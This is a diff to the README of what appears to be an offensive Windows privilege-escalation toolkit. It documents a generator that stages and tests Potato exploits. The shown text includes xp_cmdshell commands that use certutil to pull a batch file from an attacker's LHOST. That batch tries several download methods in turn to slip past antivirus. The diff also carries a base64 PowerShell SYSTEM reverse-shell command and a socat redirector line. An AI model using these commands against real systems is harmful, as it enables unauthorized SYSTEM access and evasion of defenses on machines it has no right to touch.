@@ -89,19 +89,41 @@ Set `TOOL` in **`_winpriv_common.py`** (one place, all three scripts read it); d
 
 `<CMD>` = `powershell -e <REV_B64>` (the SYSTEM revshell) for every tool. **Swap `TOOL`, re-run the same generator — no per-tool setup.**
 
-## Which Potato works here? — `gen_potato_scan.py` finds out for you
-Modern-patched Windows (KB5004442 DCOM hardening + friends) breaks *different* Potato callback paths on different boxes — SweetPotato may hang, GodPotato may return 1058, RoguePotato may spawn nothing. Rather than hand-editing `TOOL` and re-running gen_full/forma/nonet between attempts, run the auto-scanner once:
+## Which Potato works here? — `gen_potato_scan.py` stages + probes all of them for you
+Modern-patched Windows (KB5004442 DCOM hardening + friends) breaks *different* Potato callback paths on different boxes — SweetPotato may hang, GodPotato may return 1058, RoguePotato may spawn nothing. Rather than editing `TOOL` and re-running gen_full/forma/nonet between attempts — **and** hand-writing certutil fetch lines per Potato — this one generator does it all end-to-end:
+
 ```bash
-python3 gen_potato_scan.py > pscan.bat            # emits ONE batch that probes every staged Potato
-sudo python3 -m http.server 80                    # serve it
+# put every Potato exe you have in a dir:
+mkdir -p ~/potatoes && cp EfsPotato.exe SharpEfsPotato.exe GodPotato-NET4.exe ... ~/potatoes/
+cd ~/potatoes && sudo python3 -m http.server 80 &
+
+# emit ONE batch: auto-detects which exes YOU have + emits stage + scan for those
+python3 gen_potato_scan.py --serve-dir ~/potatoes > pscan.bat
+python3 -m http.server 80    # or reuse the http.server started above
 ```
+
 On target (via mssqlclient / xp_cmdshell):
 ```sql
 EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\Windows\Temp\pscan.bat';
 EXEC master..xp_cmdshell 'C:\Windows\Temp\pscan.bat';
 ```
-It fires each staged Potato against a **benign `whoami > marker` probe** (no revshell, no AV signal), hard-times-out hangs, and prints `[+] TOOL WORKS — SYSTEM confirmed` for each survivor. Set `TOOL` in `_winpriv_common.py` to a winner and re-run gen_full / gen_forma / gen_nonet as usual.
-Flags: `python3 gen_potato_scan.py --include-rogue` (also probes RoguePotato — needs the socat OXID redirector on your box) · `--stagedir "D:\path"` · `--timeout 8` (per-tool hard-kill seconds; default 6) · positional args restrict the scan to specific tools.
+
+Per Potato the batch will:
+1. **STAGE**: try `certutil` → `bitsadmin` → `curl` → `powershell Net.WebClient` — each attempt verified (file present AND ≥ 1024 bytes; AV-nuked partials count as failure and roll to the next transport). Prints `[STAGED via <method> <size>B]` or `[FAILED: all four transports blocked or AV-nuked]`.
+2. **SCAN**: fire the staged exe against a benign `whoami > marker` probe (no revshell, no AV signal), hard-timeout any hang via `taskkill`, then classify — `[+] TOOL WORKS -- SYSTEM confirmed` or a specific `[-]` reason.
+3. **Summary**: which Potatoes staged, and the winner(s).
+
+Set `TOOL` in `_winpriv_common.py` to a winner and re-run `gen_full` / `gen_forma` / `gen_nonet` as usual (same POTATOES_CMDLINE arg template = same result).
+
+Flags:
+- `--serve-dir <path>` — where your local Potato exes live (default `.`). Only exes matching known Potato names are staged; other files in the dir are ignored.
+- `--serve-url http://x:8080` — non-80 HTTP server (default `http://LHOST`).
+- `--stagedir "D:\path"` — target-side landing dir (default from `_winpriv_common.py:STAGE`).
+- `--timeout 8` — per-probe hard-kill seconds (default 6).
+- `--include-rogue` — also probe RoguePotato (needs your `socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999` running).
+- `--no-stage` — skip stage phase (assume everything already on target).
+- `--no-scan` — stage only.
+- Positional args (e.g. `EfsPotato.exe SharpEfsPotato.exe`) restrict the batch to those tools.
 
 ## Always-first setup
 ```bash
